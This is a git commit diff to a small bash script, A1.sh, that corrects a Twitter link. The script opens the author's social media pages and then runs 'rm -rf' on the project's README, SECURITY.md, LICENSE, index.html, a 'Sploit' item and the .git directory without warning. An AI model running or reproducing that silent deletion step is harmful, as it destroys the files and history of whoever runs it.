0e6932f5842f2223bd339c200a56ed5737b98c38
mike90s15 <82988362+mike90s15@users.noreply.github.com>
2023-01-28 08:49:49 -0700

    Update A1.sh

--- A1.sh
+++ A1.sh
@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 xdg-open https://instagram.com/mike90s15 
 sleep 5
-xdg-open https://twitter/mike90s15
+xdg-open https://twitter.com/mike90s15
 sleep 5
 xdg-open https://t.me/Channel_90s15
 rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"
